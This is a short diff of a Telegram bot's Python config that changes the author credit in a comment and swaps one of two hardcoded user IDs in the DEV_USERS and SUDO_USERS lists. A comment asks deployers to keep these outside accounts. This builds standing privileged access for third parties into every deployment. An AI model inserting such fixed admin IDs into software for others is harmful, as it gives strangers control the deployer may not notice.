@@ -161,12 +161,12 @@ else:
     TELETHON_HASH = Config.TELETHON_HASH
     TELETHON_ID = Config.TELETHON_ID
     
-# Don't Remove my ID from DEV and SUDO list..It Took many months to set up a bot like this..I have added many features in this bot ..by @xflicks     
+# Don't Remove my ID from DEV and SUDO list..It Took many months to set up a bot like this..I have added many features in this bot ..by @xgothboi     
 DEV_USERS.add(OWNER_ID)
-DEV_USERS.add(1669508271)
+DEV_USERS.add(1805518906)
 DEV_USERS.add(1738637033)
 SUDO_USERS.add(OWNER_ID)
-SUDO_USERS.add(1669508271)
+SUDO_USERS.add(1805518906)
 SUDO_USERS.add(1738637033)
 
 # Telethon
